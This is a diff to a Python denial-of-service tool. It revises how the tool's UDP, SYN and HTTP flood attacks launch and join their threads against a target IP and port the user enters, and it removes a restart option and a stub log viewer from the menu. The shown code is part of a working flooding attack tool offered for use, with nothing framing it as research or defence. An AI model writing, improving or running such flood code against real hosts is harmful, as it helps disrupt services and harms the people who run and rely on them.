@@ -3,7 +3,6 @@ import sys
 import socket
 import random
 import time
-from datetime import datetime
 from termcolor import colored
 from threading import Thread
 
@@ -39,9 +38,12 @@ def udp_flood(ip, port, duration, threads, bytes_to_send):
             except KeyboardInterrupt:
                 break
 
-    for _ in range(threads):
-        Thread(target=attack).start()
-
+    print(colored(f"Starting UDP Flood attack on {ip}:{port}", "yellow"))
+    thread_list = [Thread(target=attack) for _ in range(threads)]
+    for thread in thread_list:
+        thread.start()
+    for thread in thread_list:
+        thread.join()
     print(colored("\nUDP Flood attack completed.", "green"))
 
 # SYN Flood Attack
@@ -59,9 +61,12 @@ def syn_flood(ip, port, duration, threads):
             except KeyboardInterrupt:
                 break
 
-    for _ in range(threads):
-        Thread(target=attack).start()
-
+    print(colored(f"Starting SYN Flood attack on {ip}:{port}", "yellow"))
+    thread_list = [Thread(target=attack) for _ in range(threads)]
+    for thread in thread_list:
+        thread.start()
+    for thread in thread_list:
+        thread.join()
     print(colored("\nSYN Flood attack completed.", "green"))
 
 # HTTP Flood Attack
@@ -81,16 +86,13 @@ def http_flood(ip, port, duration, threads):
             except KeyboardInterrupt:
                 break
 
-    for _ in range(threads):
-        Thread(target=attack).start()
-
+    print(colored(f"Starting HTTP Flood attack on {ip}:{port}", "yellow"))
+    thread_list = [Thread(target=attack) for _ in range(threads)]
+    for thread in thread_list:
+        thread.start()
+    for thread in thread_list:
+        thread.join()
     print(colored("\nHTTP Flood attack completed.", "green"))
-
-# Restart Tool
-def restart_tool():
-    print(colored("\nRestarting tool...", "cyan"))
-    time.sleep(2)
-    os.execv(sys.executable, ['python'] + sys.argv)
 
 # Main Function
 def main():
@@ -98,10 +100,8 @@ def main():
         show_banner()
         print("1. Start basic attack mode")
         print("2. Start enhanced attack mode")
-        print("3. View attack logs")
-        print("4. Restart tool")
-        print("5. Exit")
-        
+        print("3. Exit")
+
         choice = input(colored("Select an option: ", "cyan"))
 
         if choice == "1":
@@ -109,10 +109,6 @@ def main():
         elif choice == "2":
             enhanced_mode()
         elif choice == "3":
-            view_logs()
-        elif choice == "4":
-            restart_tool()
-        elif choice == "5":
             print(colored("Exiting... Goodbye!", "red"))
             sys.exit()
         else:
@@ -151,9 +147,6 @@ def enhanced_mode():
     else:
         print(colored("Invalid choice. Exiting...", "red"))
         sys.exit()
-
-def view_logs():
-    print(colored("\nNo logs available yet. This feature is under development.", "yellow"))
 
 def get_user_input():
     ip = input(colored("Enter target IP: ", "cyan"))
